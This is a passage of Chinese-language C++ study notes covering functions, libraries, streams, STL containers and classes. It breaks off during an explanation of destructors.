<h2 id="chapter-2">Chapter 2</h2>
<h3 id="libraries-and-function">Libraries and Function</h3>
<p>当你编写C++程序时，计算机执行的大部分代码不是你自己编写的代码，而是你随应用程序加载的库代码。</p>
<ul>
<li>iostream</li>
<li>cmath：包含多个数学函数</li>
<li>string</li>
</ul>
<h3 id="overloading重载">Overloading（重载）</h3>
<p>不同函数（函数类型不同或参数不同）可以使用相同命名。例如，<code>&lt;cmath&gt;</code>库包含函数<code>abs</code>（求绝对值）的几个不同的版本，如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">abs</span><span class="params">(<span class="type">int</span> x)</span> </span>{ </span><br><span class="line">   <span class="keyword">return</span> (x &lt; <span class="number">0</span>) ? -x : x; </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">abs</span><span class="params">(<span class="type">double</span> x)</span> </span>{ </span><br><span class="line">   <span class="keyword">return</span> (x &lt; <span class="number">0</span>) ? -x : x; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="默认参数">默认参数</h3>
<p>在声明函数时，给参数设定好初始值，在调用时就可以省略该参数，如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">formatInColumns</span><span class="params">(<span class="type">int</span> nColumns = <span class="number">2</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用，此时nColumns的值自动设为2</span></span><br><span class="line">formatInColumns();</span><br></pre></td></tr></tbody></table></figure>
<p>注意：</p>
<ul>
<li>默认值的说明只出现在函数原型（声明）中，而不是在函数定义中。</li>
<li>任何默认参数都必须出现在参数列表的末尾。</li>
</ul>
<h3 id="引用参数">引用参数</h3>
<p>对于一般的参数，当你将一个简单变量从一个函数传递到另一个函数时，函数都会得到调用值的副本，该副本的修改影响不到原调用变量的值。例如下面的函数：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setToZero</span><span class="params">(<span class="type">int</span> var)</span> </span>{ </span><br><span class="line">   var = <span class="number">0</span>; </span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> x = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">setToZero</span>(x);   <span class="comment">// 不修改x的值</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>若要修改调用的变量的值，需要将一般的参数更改为引用参数，如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setToZero</span><span class="params">(<span class="type">int</span> &amp; var)</span> </span>{ </span><br><span class="line">   var = <span class="number">0</span>; </span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> x = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">setToZero</span>(x);   <span class="comment">// 修改x的值</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="接口与实现">接口与实现</h3>
<ul>
<li><strong>接口（Interface）</strong>：接口定义了库的使用方法和约定，它告诉使用者如何与库进行交互。接口包含了库向外部暴露的<strong>函数声明</strong>、<strong>类型定义</strong>和<strong>常量</strong>等内容。这些接口不会包含具体的实现细节，而是只描述了如何调用库中的功能。这些接口通常存放在<strong>头文件（header
files，.h
）</strong>中。接口可以定义函数、常量、类以及枚举，其中枚举无需通过CPP进行实现，直接就可以调用</li>
<li><strong>实现（Implementation）</strong>：实现部分则包含了函数的实际代码、类的具体实现等细节。实现隐藏在库内部，用户无需关心这些细节。实现通常放在<strong>源文件（.cpp）</strong>中，并且编译后生成库文件（静态库或动态库）</li>
</ul>
<p>下面是 error 库的接口</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* File: error.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//检查是否定义了_error_h符号。若 _error_h 符号将已经定义，编译器这次将跳过接口的内容。</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _error_h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _error_h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">error</span><span class="params">(std::string msg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>实现（Implementation）如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"error.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">error</span><span class="params">(string msg)</span> </span>{</span><br><span class="line">    cerr &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>在 .h 文件中声明常量或者变量需要使用 <strong>extern</strong>
关键字</p>
<p>https://www.runoob.com/w3cnote/extern-head-h-different.html</p>
</blockquote>
<h3 id="随机数">随机数</h3>
<p>计算机内部算法过程生成的“随机”数被称为伪随机数。</p>
<ul>
<li><p><code>rand()</code>函数（头文件<code>#include&lt;cstdlib&gt;</code>）根据上一次产生的伪随机数（旧随机数）来生成新的伪随机数，范围是
[0, RAND_MAX]</p></li>
<li><p><code>srand(int seed)</code>函数设置随机数种子
s<sub>0</sub>，然后<code>rand</code>根据该种子生成第一个随机数。相同种子产生的随机数序列是相同的（方便调试）。</p>
<p>若不手动设置种子，则默认为1。一般将其设置为一些用户难以预测的起始值，这些起始值通常取自系统时钟的值，因为每次运行程序时，这个值都是不同的，所以随机数序列也会发生变化。具体实现方法是通过调用函数
time 并将结果转换为整数来检索系统时钟的当前值。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">srand</span>(<span class="built_in">int</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>)));</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240912102359091.png" alt="image-20240912102359091">
<figcaption aria-hidden="true">image-20240912102359091</figcaption>
</figure>
<h3 id="static">static</h3>
<ol type="1">
<li>静态局部变量
<ul>
<li>静态局部变量在函数第一次调用时初始化。</li>
<li>变量在后续的函数调用中会保留它之前的值，不会被重新初始化。</li>
<li>它的作用域依然只限于函数内部，但生命周期持续到程序结束</li>
</ul></li>
<li>静态全局变量
<ul>
<li>在全局作用域中，如果变量用<code>static</code>修饰，变量的可见性（链接性）被限制在当前文件中。这种用法称为<strong>内部链接</strong>（internal
linkage）。即该变量无法被其他文件使用，即使它是全局的。</li>
</ul></li>
<li>静态函数
<ul>
<li>只能在定义的源文件中使用，不能被其他文件访问</li>
</ul></li>
<li>类的静态成员变量
<ul>
<li>静态成员变量的存储空间是全局的，在程序启动时就分配。</li>
<li>它不属于任何特定的类实例（对象），所以可以通过类名直接访问。</li>
<li>静态成员变量必须在类定义外进行初始化。</li>
</ul></li>
<li>类的静态成员函数
<ul>
<li>静态成员函数只能访问静态成员变量。</li>
<li>不需要通过类的对象来调用，可以直接通过类名调用。</li>
</ul></li>
</ol>
<h2 id="chapter-3">Chapter 3</h2>
<h3 id="string">string</h3>
<p>访问字符串内部的字符有两种方法：</p>
<ul>
<li><code>str[index]</code></li>
<li><code>str.at(index)</code></li>
</ul>
<p><code>string</code>类型可以通过<code>=</code>直接赋值，例如<code>str1=str2</code>，用<code>str2</code>中包含的字符串副本覆盖<code>str1</code>的先前内容，赋值过后再修改<code>str2</code>无法影响到<code>str1</code></p>
<p><code>string</code>类型包含截断函数<code>substr</code>，例如<code>str.substr(2, 3)</code>，意思是从索引2开始截取三个字符，若省略3，则从2截取到字符串结尾。</p>
<p><code>find</code>函数可以查找子字符串或字符，例如<code>str.find("o")</code></p>
<h3 id="cctype">&lt;cctype&gt;</h3>
<p>用于处理字符的库</p>
<h2 id="chapter-4">Chapter 4</h2>
<h3 id="streams">Streams</h3>
<p><code>&lt;iostream&gt;</code>中的三个标准流：<code>cin</code>、<code>cout</code>、<code>cerr</code></p>
<h3 id="manipulator操纵器">manipulator（操纵器）</h3>
<p>操纵器通常具有以改变后续输出格式的方式设置输出流属性的效果。</p>
<p>例如：<code>&lt;iostream&gt;</code>库中的<code>endl</code>，<code>&lt;iomanip&gt;</code>库中的<code>setw(n)</code>（设置输出宽度）、<code>setprecision(digits)</code>、<code>setfill(ch)</code></p>
<h3 id="file-streamsfstream">File streams（&lt;fstream&gt;）</h3>
<p>在C++中读取或写入文件需要以下步骤：</p>
<ol type="1">
<li><p>声明一个流变量来引用文件。处理文件的程序通常为同时处于活动状态的每个文件声明一个流变量。因此，如果你正在编写一个读取输入文件并使用该数据写入输出文件的程序，你需要声明两个变量，如下所示</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line">ifstream infile;  <span class="comment">// 用于读取文件数据</span></span><br><span class="line">ofstream outfile;  <span class="comment">//向文件写入数据</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>打开文件，在使用流变量之前，您需要在该变量和实际文件之间建立关联。此操作称为打开文件，通过调用流方法open来执行。例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">infile.<span class="built_in">open</span>(<span class="string">"Jabberwocky.txt"</span>); </span><br></pre></td></tr></tbody></table></figure>
<p>或者：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string filename = <span class="string">"Jabberwocky.txt"</span>;</span><br><span class="line">infile.<span class="built_in">open</span>(filename.<span class="built_in">c_str</span>());  <span class="comment">// open方法需要一个C样式的字符串作为文件名</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>传输数据</p>
<p>打开数据文件之后，就可以使用适当的流操作来执行实际的 I/O
操作。可以逐字符传输，也可以逐行传输。</p></li>
<li><p>关闭文件</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">infile.<span class="built_in">close</span>();</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="单个字符-io">单个字符 I/O</h3>
<h4 id="输入流">输入流</h4>
<p>使用<code>get()</code>方法获取单个字符，如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ch; </span><br><span class="line">infile.<span class="built_in">get</span>(ch);</span><br></pre></td></tr></tbody></table></figure>
<p>连续读取字符：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* get将下一个字符读入变量ch并返回流。如果get操作成功，则该流被解释为true，如果失败，则被解释为false</span></span><br><span class="line"><span class="comment">* 实际上 get 的返回值是 int 类型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">char</span> ch; </span><br><span class="line"><span class="keyword">while</span> (infile.<span class="built_in">get</span>(ch)) { </span><br><span class="line">   Perform some operation on the character. </span><br><span class="line">}</span><br><span class="line"><span class="comment">// 下面是另一种写法</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) { </span><br><span class="line">   <span class="type">int</span> ch = infile.<span class="built_in">get</span>(); </span><br><span class="line">   <span class="keyword">if</span> (ch == EOF) <span class="keyword">break</span>;   <span class="comment">// end-of-file</span></span><br><span class="line">   Perform some operation on the character. </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="输出流">输出流</h4>
<p>使用<code>put</code>函数，该函数采用char值作为参数，并将该字符写入流中，如下所示：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outfile.<span class="built_in">put</span>(ch);</span><br></pre></td></tr></tbody></table></figure>
<h3 id="string-streamssstream">String streams（&lt;sstream&gt;）</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">istringstream  //字符串输入流 类，可用于字符串转整型</span><br><span class="line">ostringstream  //字符串输出流 类，可用于整型转字符串</span><br></pre></td></tr></tbody></table></figure>
<h2 id="chapter-5">Chapter 5</h2>
<p>集合类（抽象数据类型）：Vector，Stack，Queue，Map，Set</p>
<h3 id="vector">Vector</h3>
<ol type="1">
<li>头文件 <code>#include &lt;vector&gt;</code></li>
<li>定义一个整型vector：<code>vector&lt;int&gt; vec;</code>
（该vector为空）</li>
<li>向结尾添加新元素：<code>vec.push_back(10);</code></li>
<li>向vector中间插入元素：<code>vec.insert(index, num);</code></li>
<li>删除元素：<code>vec.erase(index);</code></li>
<li>访问元素：类似于数组，通过下标访问例如<code>vec[2]</code>，或者通过<code>vec.at(2)</code>访问</li>
<li>获取vector大小：<code>vec.size()</code></li>
<li>二维数组：<code>vector&lt; vector&lt;int&gt; &gt; a;</code>或者指定二维数组的行和列大小<code>vector&lt; vector&lt;int&gt; &gt; a(r, vector&lt;int&gt;(c));</code>（r为行数，c为列数）</li>
</ol>
<h3 id="stack">Stack</h3>
<p>先进后出</p>
<ul>
<li>头文件：<code>#include &lt;stack&gt;</code></li>
<li><code>push()</code>: 在栈顶添加一个元素。</li>
<li><code>pop()</code>: 移除栈顶元素。</li>
<li><code>top()</code>: 返回栈顶元素的引用，但不移除它。</li>
<li><code>empty()</code>: 检查栈是否为空。</li>
<li><code>size()</code>: 返回栈中元素的数量</li>
</ul>
<h3 id="queue">Queue</h3>
<p>先进先出</p>
<ul>
<li>头文件：<code>#include &lt;queue&gt;</code></li>
<li><code>empty()</code>: 检查队列是否为空。</li>
<li><code>size()</code>: 返回队列中的元素数量。</li>
<li><code>front()</code>: 返回队首元素的引用。</li>
<li><code>back()</code>: 返回队尾元素的引用。</li>
<li><code>push()</code>: 在队尾添加一个元素。</li>
<li><code>pop()</code>: 移除队首元素。</li>
</ul>
<h3 id="map">Map</h3>
<p>概念上类似于字典。一个<code>key</code>对应一个<code>value</code>（键值对）</p>
<ul>
<li><p>头文件：<code>#include &lt;map&gt;</code></p></li>
<li><p>声明
map：<code>map&lt;key_type, value_type&gt; myMap;</code></p></li>
<li><p>Stanford的<code>map.h</code>库使用<code>put(key, value)</code>将<code>key</code>与<code>value</code>进行关联，使用<code>get(key)</code>获取<code>value</code></p>
<p>或者直接<code>myMap[key] = value;</code></p></li>
<li><p><code>find(key)</code>返回指向该元素的迭代器，示例：https://www.cainiaojc.com/cpp/cpp-map-find-function.html</p></li>
</ul>
<h3 id="set">Set</h3>
<p>set中的每个元素都是唯一的</p>
<ul>
<li>头文件：<code>#include &lt;set&gt;</code></li>
</ul>
<blockquote>
<p>集合类的for循环简化：Range-based
for（只读，不能修改variable；若要修改可通过引用实现）</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (type variable : collection) { </span><br><span class="line">   body of the loop </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<h2 id="chapter-6">Chapter 6</h2>
<p>类</p>
<h3 id="结构体">结构体</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> {</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">};</span><br><span class="line">Point p;</span><br></pre></td></tr></tbody></table></figure>
<p>C++中可直接用结构体名称声明变量（<strong>C语言中必须使用</strong><code>struct Point p;</code>进行声明）</p>
<blockquote>
<p><strong>1. 使用 <code>struct</code>
关键字来定义和引用结构体类型</strong></p>
<p>C 语言的结构体类型必须使用 <code>struct</code> 关键字，直接使用
<code>struct</code> 名称进行命名和访问。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> {</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用时必须加上 `struct` 关键字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> <span class="title">p</span>;</span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>2. 使用 <code>typedef</code> 为结构体创建别名</strong></p>
<p>如果你不想每次使用结构体时都加上 <code>struct</code> 关键字，可以用
<code>typedef</code> 为结构体创建一个简化的别名。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">} Point;  <span class="comment">// 给结构体类型起别名为 Point</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用时不需要 `struct` 关键字</span></span><br><span class="line">Point p;</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<h3 id="类">类</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> {</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="type">int</span> x;</span><br><span class="line">    	<span class="type">int</span> y;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><p>类与结构体的区别在于类中的字段可分为<code>public</code>和<code>private</code>两个部分</p></li>
<li><p>在现代面向对象编程中，不鼓励声明公共实例变量。常见的做法是将所有实例变量设置为私有，这意味着客户端无法直接访问内部变量。而是通过类中的函数来访问私有变量。</p></li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> {</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="type">int</span> x;</span><br><span class="line">    	<span class="type">int</span> y;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span> </span>{  <span class="comment">// 通过公有函数访问私有变量</span></span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        }</span><br><span class="line">    	<span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">()</span> </span>{</span><br><span class="line">            <span class="keyword">return</span> y;</span><br><span class="line">        }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<h4 id="构造函数constructor">构造函数（Constructor）</h4>
<ul>
<li>构造函数始终与类同名，大多数类一般会有一个不带参数的默认构造函数。</li>
<li>类通常定义多个版本的构造函数，以考虑不同的初始化模式</li>
<li>构造函数可以进行重载</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> {</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">Point</span>() {  <span class="comment">// 默认构造函数</span></span><br><span class="line">            x = <span class="number">0</span>;</span><br><span class="line">            y = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    	</span><br><span class="line">    	<span class="built_in">Point</span>(<span class="type">int</span> xc, <span class="type">int</span> yc) {  <span class="comment">// 含参数的构造函数</span></span><br><span class="line">            x = xc;</span><br><span class="line">            y = yc;</span><br><span class="line">        }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<ol type="1">
<li><strong>构造函数体内赋值：</strong></li>
</ol>
<ul>
<li>先调用成员变量的默认构造函数，然后在构造函数体内对它们进行赋值操作。</li>
<li>对于基础类型没有明显区别，但对于类成员（如对象、容器等），会多一次默认构造和赋值操作。</li>
</ul>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> {</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> x, <span class="type">int</span> y) {</span><br><span class="line">        a = x;  <span class="comment">// 先默认构造，再赋值</span></span><br><span class="line">        b = y;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<ol start="2" type="1">
<li><strong>初始化列表：</strong></li>
</ol>
<ul>
<li>在构造对象时直接调用带参数的构造函数进行<strong>初始化</strong>，<strong>避免了不必要的赋值操作</strong>。</li>
<li>对于需要初始化的成员变量（如<code>const</code>成员、引用成员，或者没有默认构造函数的对象），必须使用初始化列表。</li>
</ul>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> {</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> x, <span class="type">int</span> y) : <span class="built_in">a</span>(x), <span class="built_in">b</span>(y) {  <span class="comment">// 初始化列表直接初始化</span></span><br><span class="line">        <span class="comment">// 构造函数体</span></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<h4 id="拷贝构造函数">拷贝构造函数</h4>
<blockquote>
<ol type="1">
<li><p>如果你没有定义自己的拷贝构造函数，C++
会为类生成一个<strong>默认</strong>的拷贝构造函数。这个默认拷贝构造函数只是简单地逐成员地复制对象的每个成员变量，称为
<strong>浅拷贝</strong>。</p>
<p>浅拷贝在复制对象时，只会复制指针的地址而不会复制其指向的数据，可能会导致多个对象指向同一块内存区域，这会引发
<strong>双重释放</strong> 或 <strong>悬空指针</strong> 等问题。</p></li>
<li><p>如果类中有需要特殊管理的资源（例如动态分配的内存、文件句柄等），你通常需要编写自定义的拷贝构造函数来实现
<strong>深拷贝</strong>，即复制这些资源，而不仅仅是复制指针。</p></li>
</ol>
</blockquote>
<p>默认拷贝构造函数：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ClassName</span>(<span class="type">const</span> ClassName&amp; other);</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><p>拷贝构造函数的参数使用的是<strong>引用</strong>（<code>&amp;</code>），而不是按值传递，这是因为按值传递会调用另一个拷贝构造函数来传递参数，这样就会导致<strong>无限递归调用</strong>。</p></li>
<li><p>使用 <code>const</code>
修饰引用是为了防止在拷贝过程中对传入的对象进行修改。</p></li>
<li><p>使用 <code>const</code>
还能确保拷贝构造函数可以处理<strong>临时对象</strong>（即右值）。如果不加
<code>const</code>，则不能对一个临时对象（如
<code>HeapPQueue()</code>）进行拷贝，因为临时对象无法绑定到非
<code>const</code> 引用。示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapPQueue hq1 = <span class="built_in">HeapPQueue</span>();  <span class="comment">// 临时对象可以绑定到 const 引用</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>拷贝构造函数会在以下情况下被调用：</p>
<ol type="1">
<li><p><strong>对象的按值传递</strong>：当一个对象通过值传递给函数时，C++
会创建该对象的副本，调用拷贝构造函数。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(MyClass obj)</span></span>;  <span class="comment">// obj 作为参数，是按值传递的，会调用拷贝构造函数</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>对象作为返回值按值返回</strong>：当一个对象从函数中按值返回时，也会调用拷贝构造函数。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MyClass <span class="title">bar</span><span class="params">()</span> </span>{</span><br><span class="line">    MyClass obj;</span><br><span class="line">    <span class="keyword">return</span> obj;  <span class="comment">// 按值返回，调用拷贝构造函数</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>用现有对象初始化新对象</strong>：当用一个现有对象来初始化另一个对象时（例如通过赋值），也会调用拷贝构造函数。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MyClass obj1;</span><br><span class="line">MyClass obj2 = obj1;  <span class="comment">// obj2 是用 obj1 初始化的，调用拷贝构造函数</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>对象被放入 STL 容器</strong>：当你将对象放入 STL 容器（如
<code>std::vector</code>、<code>std::map</code>
等）中时，这些容器可能会通过拷贝构造函数来复制对象。</p></li>
</ol>
<h4 id="析构函数">析构函数</h4>
<blockquote>
<p><strong>析构函数</strong>的作用是在对象的生命周期结束时执行清理工作，特别是释放对象持有的动态资源（例如内存、文件句柄、网络连接等）。它确保在对象销毁时，相关的资源能够被正确释放，避免内存泄漏等问题。</p>
